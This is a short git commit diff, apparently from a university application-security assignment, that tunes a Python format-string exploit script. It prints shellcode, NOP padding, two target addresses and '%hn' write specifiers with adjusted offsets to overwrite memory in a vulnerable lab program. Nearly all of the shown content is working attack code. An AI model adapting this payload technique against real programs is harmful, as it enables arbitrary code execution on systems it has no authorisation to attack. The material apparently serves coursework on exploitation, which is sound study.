0718fcb648c724c6cb786dc3996d3314bd42408c
Dipayan <dipayan2@illinois.edu>
2020-09-12 16:01:47 -0500

    1.2.9 -- done

--- AppSec/1.2.9.py
+++ AppSec/1.2.9.py
@@ -8,4 +8,5 @@ from struct import pack
 padding = b"\x90"
 ADDR1 = b"\x6c\xb3\xfe\xff"
 ADDR2 = b"\x6e\xb3\xfe\xff"
-sys.stdout.buffer.write(shellcode + padding + ADDR1 + ADDR2 +b"%43840x%19$hn%21648x%20$hn")
+sys.stdout.buffer.write(shellcode + padding + ADDR1 + ADDR2 +b"%43840x%10$hn%21662x%11$hn")
+#sys.stdout.buffer.write(shellcode + padding + ADDR1 + ADDR2 +b"%43840x%2$hn")
